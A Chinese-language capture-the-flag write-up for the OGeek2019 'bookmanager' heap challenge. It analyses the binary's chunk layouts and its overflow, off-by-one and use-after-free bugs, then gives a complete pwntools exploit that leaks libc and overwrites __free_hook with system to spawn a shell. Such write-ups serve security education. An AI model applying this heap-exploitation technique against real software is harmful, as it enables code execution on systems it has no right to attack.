OGeek2019-bookmanager#

# 总结

本题比较简单，就是题目流程比较复杂一点，用到的知识点就一个：

当chunk被放置到unsorted bin中时，其fd指针会指向main_arena+88这个地址，可以用来泄露libc地址

# checksec

```bash
$ checksec ./pwn
[*] './pwn'
    Arch:     amd64-64-Little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全开，题目运行环境为ubuntu 16.04， libc-2.23.so。

# 题目分析
题目实现了对书的管理，包括章节、主题等。书所需要的内存都是从堆上分配的。

首先，分配0x90大小的内存，存放书的信息，结构如下：

| 偏移 | 字段（低地址） | 字段（高地址） |
| --- | --- | --- |
| 0x0  | pre_size      | 0x91           |
| 0x10 | book_name     | book_name      |
| 0x20 | book_name     | book_name      |
| 0x30 | chapter_ptr0  | chapter_ptr1   |
| 0x40 | chapter_ptr2  | chapter_ptr3   |
| 0x50 | chapter_ptr4  | chapter_ptr5   |
| 0x60 | chapter_ptr6  | chapter_ptr7   |
| 0x70 | chapter_ptr8  | chapter_ptr9   |
| 0x80 | chapter_ptr10 | chapter_ptr11  |

然后，每一个章节的结构，也是0x90大小的chunk，内存布局如下：

| 偏移 | 字段（低地址） | 字段（高地址） |
| --- | --- | --- |
| 0x0  | pre_size      | 0x91           |
| 0x10 | chapter_name  | chapter_name   |
| 0x20 | chapter_name  | chapter_name   |
| 0x30 | section_ptr0  | section_ptr1   |
| 0x40 | section_ptr2  | section_ptr3   |
| 0x50 | section_ptr4  | section_ptr5   |
| 0x60 | section_ptr6  | section_ptr7   |
| 0x70 | section_ptr8  | section_ptr9   |
| 0x80 |               |                |

然后每个section都是大小为0x40的chunk，其内存布局如下：

| 偏移 | 字段（低地址） | 字段（高地址）         |
| --- | --- | --- |
| 0x0  | pre_size     | 0x41                  |
| 0x10 | section_name | section_name          |
| 0x20 | section_name | section_name          |
| 0x30 | text_ptr     | 0x0000000000000020    |

text_ptr对应的大小由用户指定，输入大小不超过0x100

# 漏洞分析
漏洞点有4处，有两处在add_text函数中：

```c
printf("\nHow many chapters you want to write: ", &s2);
size = get_int_num(&s2);
if ( size <= 0x100 )    //可以为负数绕过检验
{
  v2 = *(_QWORD *)(*(_QWORD *)(a1 + 8 * (v5 + 4LL)) + 8 * (i + 4LL));
  *(_QWORD *)(v2 + 0x20) = malloc(size);
  printf("\nText:");
  read_off_by_one(&s, 0x100u);
  v3 = strlen(&s);
  memcpy(*(void **)(v2 + 0x20), &s, v3);    //越界写
}
```

第40行可以输入负数绕过校验，第45和47行，如果输入小于0x100的正数，则会越界写。

第三处在remove_section函数中：

```c
read_off_by_one(&s1, 0xFFu);
for ( i = 0; i <= 9; ++i )  //所有chapter中同名的section都删掉
{
  for ( j = 0; j <= 9; ++j )
  {
    if ( *(_QWORD *)(*(_QWORD *)(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL))
      && !strcmp(*(const char **)(*(_QWORD *)(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL)), &s1) )
    {
      if ( *(_QWORD *)(*(_QWORD *)(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL) + 0x20LL) )
        free(*(void **)(*(_QWORD *)(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL) + 0x20LL));
      *(_QWORD *)(*(_QWORD *)(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL) + 0x20LL) = 0LL;
      free(*(void **)(*(_QWORD *)(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL))); // uaf
    }
  }
}
```

这里存在一个UAF漏洞。

第四出在updapte函数中：

```c
printf("\nSection name: ");
read_off_by_one(&s, 0x20u);
while ( v6 <= 9 )
{
  if ( *(_QWORD *)(a1 + 8 * (v6 + 4LL)) )
  {
    v7 = 0;
    while ( v7 <= 9 )
    {
      if ( *(_QWORD *)(*(_QWORD *)(a1 + 8 * (v6 + 4LL)) + 8 * (v7 + 4LL))
        && !strcmp(*(const char **)(*(_QWORD *)(a1 + 8 * (v6 + 4LL)) + 8 * (v7 + 4LL)), &s) )
      {
        printf("\nNew Text:");
        read_off_by_one(*(void **)(*(_QWORD *)(a1 + 8 * (v6 + 4LL)) + 8 * (v7 + 4LL) + 0x20LL), 0xFFu);
        printf("\nUpdated", 255LL);
        return __readfsqword(0x28u) ^ v9;
      }
      ++v7;
    }
  }
  ++v6;
}
```

同样是会越界写，指定了写的大小为0x100。

其实还有一个，就是我标注的read_off_by_one函数，会越界写一个字节。但是也要注意，这个函数里有memset(addr, 0, len)，会把内存置为0。

# 利用思路
利用思路很多，因为题目漏洞给得实在是太多了，分享我的利用过程如下：

- 分配一个0x100大小的chunk，作为一个存储text的内存块，前面紧挨着一个0x90的内存块，可以被用作chapter
- 使用掉高地址的chapter，然后update低地址的text块。由于会把0xff的内存刷为0，所以必须要构造0x100大小的text内存块。直接填满0x100个a后。
- 使用book_preview，就会打印出unsorted bin的fd内容，得到libc地址
- 用update的越界写，修改某个section的text_ptr指针，修改为__free_hook的地址
- 然后update那个section的text，就是在往__free_hook写内容，填上system地址
- 释放带有/bin/sh的内存块，即可获得shell

# 最终EXP
泄露地址：

image

修改text_ptr：

image

修改__free_hook为system地址：

image

```python
from pwn import *

LOG_ADDR = lambda x, y: info("{} ===> {}".format(x, hex(y)))

sh = process("./pwn")

libc = ELF('libc-2.23.so')

context.update(arch="amd64", os="linux", endian="little")

def add_book(book_name):
    sh.sendlineafter("Name of the book you want to create: ", book_name)


def add_chapter(chapter_name="abc"):
    assert len(chapter_name) <= 20, "len error!"
    sh.sendlineafter("\nYour choice:", "1")
    sh.sendlineafter("\nChapter name:", chapter_name)


def add_section(chapter_name="abc", section_name="123"):
    sh.sendlineafter("\nYour choice:", "2")
    sh.sendlineafter("\nWhich chapter do you want to add into:", chapter_name)
    leak_msg = sh.recvline()
    log.info("msg recv===>{}".format(leak_msg))
    sh.sendlineafter("Section name:", section_name)
    return leak_msg


def add_text(section_name="123", size:int=0x80, text="a"):
    sh.sendlineafter("\nYour choice:", "3")
    sh.sendlineafter("\nWhich section do you want to add into:", section_name)
    sh.sendlineafter("\nHow many chapters you want to write:", str(size))
    sh.sendlineafter("\nText:", text)


def remove_chapter(chapter_name="abc"):
    sh.sendlineafter("\nYour choice:", "4")
    sh.sendlineafter("\nChapter name:", chapter_name)


def remove_section(section_name="123"):
    sh.sendlineafter("\nYour choice:", "5")
    sh.sendlineafter("\nSection name:", section_name)


def remove_text(section_name="123"):
    sh.sendlineafter("\nYour choice:", "6")
    sh.sendlineafter("\nSection name:", section_name)


def book_preview():
    sh.sendlineafter("\nYour choice:", "7")
    sh.recvuntil("\nBook:")
    msg = sh.recvuntil("\n==========================")
    log.info("msg recv:{}".format(msg))
    return msg

def update(mode=0, old_name="abc", new_name="efg"):
    sh.sendlineafter("\nYour choice:", "8")
    sh.recvuntil("\nWhat to update?(Chapter/Section/Text):")
    if mode == 0:
        sh.sendline("Chapter")
        sh.sendlineafter("\nChapter name:", old_name)
        sh.sendlineafter("\nNew Chapter name:", new_name)
        sh.recvuntil("\nUpdated")
    elif mode == 1:
        sh.sendline("Section")
        sh.sendlineafter("\nSection name:", old_name)
        sh.sendlineafter("\nNew Section name:", new_name)
        sh.recvuntil("\nUpdated")
    else:
        sh.sendline("Text")
        sh.sendlineafter("\nSection name:", old_name)
        sh.sendafter("\nNew Text:", new_name)
        sh.recvuntil("\nUpdated")


# leak libc addr
add_book("xxe")
add_chapter("a")
add_section("a", "a.a")
add_text("a.a", 0xf0, "a.a.a")
add_chapter("b")
add_section("b", "b.a")
remove_chapter("b")
update(2, "a.a", "a" * 0x100)
msg = book_preview()
idx = msg.index(b"\x7f")
leak_libc_addr = u64(msg[idx-5:idx + 1].ljust(8, b"\x00"))
LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x3c4b20 - 88
LOG_ADDR("libc_base_addr", libc_base_addr)
libc.address = libc_base_addr

# recover
update(2, "a.a", flat("a"*0xf0, 0, 0x91))
add_chapter("b")
add_section("b", "b.a")
remove_text("a.a")
add_text("a.a", 0xb0, "a.a.b")

# change section's text_ptr
add_section("a", "/bin/sh")
layout = [0xb0 * "a", 0, 0x41, 
        "/bin/sh".ljust(8, "\x00"), [0] * 3, libc.sym["__free_hook"], 32]
update(2, "a.a", flat(layout, length=0x100, filler="\x00"))

# fill system addr at __free_hook
update(2, "/bin/sh", flat([libc.sym['system']], length=0x100, filler="\x00"))

# get shell
remove_section("/bin/sh")

sh.interactive()
```